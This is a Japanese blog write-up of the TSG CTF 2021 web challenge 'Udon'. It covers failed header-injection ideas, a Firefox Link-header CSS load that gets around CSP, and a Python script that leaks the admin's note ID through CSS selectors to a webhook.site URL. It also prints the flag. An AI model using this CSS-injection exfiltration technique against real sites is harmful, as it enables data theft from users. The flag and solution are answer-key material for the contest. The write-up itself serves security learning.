---
title: TSG CTF 2021 writeup - Udon
thumbnail: /images/2021/20211006-tsgctf-01.png
date: 2021-10-06 23:00:00
tags:
    - CTF
description: TSG CTF 2021 に ./Vespiary で参加して3位でした！Udonのwriteupを書きます。
---

TSG CTF 2021 に ./Vespiary で参加して3位でした！

![](/images/2021/20211006-tsgctf-02.png =480x)

自分はweb問のUdonしか解いていないのでチームメンバーに感謝です。以下ではUdonのwriteupを書きます。

**> My short writeup in English is [here](https://ctftime.org/writeup/30728). <**

## Links

- 公式サイト: https://score.ctf.tsg.ne.jp/
- ctftime: https://ctftime.org/event/1431
- Udonの作問者writeup: https://diary.shift-js.info/tsgctf-2021-udon/

## 問題概要 - [web] Udon

![](/images/2021/20211006-tsgctf-03.png)

- よくあるnote投稿系サービス
- adminの投稿されたnoteにフラグが書かれている
- botがあるのでXSS問かと思いきやXSSできる場所はない
- CSP: `Content-Security-Policy: script-src 'self'; style-src 'self'; base-uri 'none'`
- （重要1）クエリパラメータにk,vを与えることで任意のヘッダーをひとつだけ付けることができる
- （重要2）botのブラウザがfirefox[^1]

[^1]: web問でのbotは大抵chromeが使われるので、firefoxの場合には「そこが攻撃ポイントになることが多い」というメタ読みができます。

好きなヘッダを付けられるというのが特徴的。

## NG集

最終的な解法だけ載せるのも味気ないので、解法を思いつくまでに出てきたダメだったアイデアを書きます。

### NG1: ヘッダのvalueに`\r\n`を仕込む

そもそも無理だろうと思ったけど、やっぱりダメでした。
これができたら複数のヘッダを追加したりbodyを改竄したりできておもしろいんですけどね...

ちなみに作問者曰く
<blockquote class="twitter-tweet"><p lang="ja" dir="ltr">ちなみにクエリパラメータの k のほうだけ謎 validation してるのは、go の net/http の Header の Write() がヘッダ名中の改行文字をそのままレスポンス中に出力してしまうからです（そんなことないだろと思ってたけど .<a href="https://twitter.com/hakatashi?ref_src=twsrc%5Etfw">@hakatashi</a> がレビューで見つけて教えてくれた）<a href="https://t.co/wVvGeSrYm6">https://t.co/wVvGeSrYm6</a></p>&mdash; YONEUCHI, Takashi (@lmt_swallow) <a href="https://twitter.com/lmt_swallow/status/1444582966114406402?ref_src=twsrc%5Etfw">October 3, 2021</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
だそうです。latestでは修正されているとのこと。

### NG2: CSPの`report-uri`で情報漏洩

ヘッダを追加するときに既存のヘッダを上書きするようになっているので、すでにある`Content-Security-Policy`を書き換えることが可能です。

`index.html`の
```html
<li><a href="/notes/{{ .ID }}">{{ .Title }}</a></li>
```
のID部分、つまりaタグのhrefの値を`report-uri`ディレクティブでいい感じにreportできると嬉しいんですが、そんな都合良いものはなかったです。

### NG3: 通常リダイレクトのLocation指定

botにアクセス先として指定できるURLは問題ページに対してのみですが、これが任意のURLに飛ばせるようになったら攻撃の幅が広がります。

`main.go`の`/reset`エンドポイントの実装は
```go
	r.GET("/reset", func(c *gin.Context) {
		c.Redirect(http.StatusFound, "/")
	})
```
のようになっているので`/reset?k=Location&v=https://example.com`で好きなところにリダイレクトできないかなあと考えたけど、`c.Redirect(...)`が`Location`の値を`/`に上書きしたのでダメでした。それはそう。

### NG4: Refreshによるリダイレクト

ところで[metaタグrefreshでリダイレクトするやつ](https://developer.mozilla.org/ja/docs/Web/HTTP/Redirections#html_redirections)あるじゃないですか。あれ、実はヘッダでも動くんですよ。ということで
```javascript
"/?k=Refresh&v=" + encodeURIComponent("0;url=https://example.com")
```
の値を投げてみたんですが、リダイレクトしてくれませんでした。

手元のchromeでもfirefoxでもリダイレクトできることを確認したので謎だったんですが、botの実装の
```javascript
  await page
    .goto(url, {
      waitUntil: "load",
      timeout: 3000,
    })
    .catch((e) => {
      console.error(e);
    });

  await page.close();
  await browser.close();
```
で、`await page.close();`の前に適当にsleepを入れたらリダイレクトしてくれました。`await page.goto(...)`はRefreshするまでawaitしてくれませんでした。悲しきかな。実際にはsleepなんて入っているわけないので終了。

ちなみにsleepを入れなくても一瞬はリダイレクトしようとするわけだから、TCPで待機してたらリクエストヘッダくらいは見れるんじゃない？とチームメンバーが検証してくれて、見れることが確認できました。攻撃への利用は...無理です。

### NG5: `Content-Type`で`charset`指定からのbypass

`Content-Type`の上書きができるんだからcharsetいじってXSSのvalidationをbypassできないかなと思って
```javascript
"http://34.84.69.72:8080/?k=Content-Type&v=" + encodeURIComponent("text/html; charset=UTF-16BE")
```
の値を投げてみました：
![](/images/2021/20211006-tsgctf-04.png)

良さげ。なお、WHATWGによれば

> The above prohibits supporting, for example, CESU-8, UTF-7, BOCU-1, SCSU, EBCDIC, and UTF-32. This specification does not make any attempt to support prohibited encodings in its algorithms; support and use of prohibited encodings would thus lead to unexpected behavior. [CESU8] [UTF7] [BOCU1] [SCSU]
> https://html.spec.whatwg.org/#character-encodings

だそうです。UTF-7とかでbypassしたかったけどモダンなブラウザでは無理っぽいです。すべておしまい。

以上、NG集でした。

## 解法

アイデアが尽きてきて行き詰まってたんですが、アイデア出しに参加してもらってたチームメンバーの人が、LinkヘッダでCSSを読み込めることを見つけて来てくれました。

！？

いや〜そんなばかな、ヘッダでCSS読み込めるわけないじゃんと思っていたらfirefoxだと読み込めました。

::: webcard https://qiita.com/mpyw/items/203012d8b9e5386e6f0b
:::

firefoxのみこの仕様みたいです。これじゃん。

あとはフラグまで一本道です。

```css
{} * { background: black; }
```
のようなCSSになっているノートを投稿して（ノートID：`zibXjydLKQ`）


```javascript
location = "http://34.84.69.72:8080/?k=Link&v=" + encodeURIComponent("<http://34.84.69.72:8080/notes/zibXjydLKQ?k=Content-Type&v=" + encodeURIComponent("text/css; charset=utf-8") + ">; rel=\"stylesheet\"")
```
でCSP bypassしたら

![](/images/2021/20211006-tsgctf-05.png)
で期待通り背景真っ暗になることが確認できました。

CSS InjectionでadminのノートIDを盗むスクリプトを書きます：

```python
import httpx
from urllib.parse import quote

# base_url = "http://localhost:8080"
base_url = "http://34.84.69.72:8080"
base_ssrf_url = "http://app:8080"

hook_url = "https://webhook.site/xxx-xxx-xxx-xxx-xxx"

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

suffix = "R1cmOAtdG"  # 現時点で確定しているIDのsuffix
n = 1                 # 一度に確定する文字数


def f(n: int):
    note_description = "{}\n"

    def rec(d: int, s: str) -> list[str]:
        if d == n:
            return [s]
        else:
            return sum([rec(d+1, s+c) for c in chars], [])

    for c in rec(0, ""):
        note_description += "li a[href$={{value}}] { background: url({{hook_url}}/{{value}}) }\n".replace("{{value}}", c + suffix).replace("{{hook_url}}", hook_url)

    res = httpx.post(
        base_url + "/notes",
        data={
            "title": "xxx",
            "description": note_description,
        },
        allow_redirects=False,
    )
    assert res.status_code == 302

    note_url = base_ssrf_url + res.headers["Location"]
    print(note_url)
    exploit_path = "/?k=Link&v=" + quote("<" + note_url + "?k=Content-Type&v=" + quote("text/css; charset=utf-8") + ">; rel=\"stylesheet\"")

    res = httpx.post(
        base_url + "/tell",
        data={
            "path": exploit_path,
        },
        allow_redirects=False,
    )
    assert res.status_code == 302


f(n)
```

何度かスクリプトを回すことでadminノートのIDを後方から確定していきます。
本当は `hook_url` でホストして自動化したほうがかっこいいのですが、今回はIDが10文字で短いことがわかっていたので手動で確定させました。

また、`a[href $= 1abc]`のように数字から始まるとCSSセレクタとしてvalidではないため、1文字ずつではなく`n`文字ずつ確定できるようになっています。最後（先頭の文字）は数字のようだったので0から9までbrute forceしました。[作問者writeup](https://diary.shift-js.info/tsgctf-2021-udon/)によれば`a[href $= \31\61\62\63]`でエスケープできたんですね。知らなかった。

最終的にIDは`4R1cmOAtdG`でした。該当ノートのページにアクセスするとフラグゲットです。

## フラグ

```
TSGCTF{uo_uo_uo_uo_uoooooooo_uo_no_gawa_love}
```

## 感想

TSG CTFらしく、「有り余るCS力と作問センスでぶん殴ったらできました」的な印象を受けた問題たちでした。
色々な問題に取り組みたいけど24hでは短い、かと言って48hになると疲れてしまうので自分が強くなるしかないですね。精進します。

運営・作問の方々たのしいCTFをありがとうございました。来年のTSG CTFにも参加したいです。
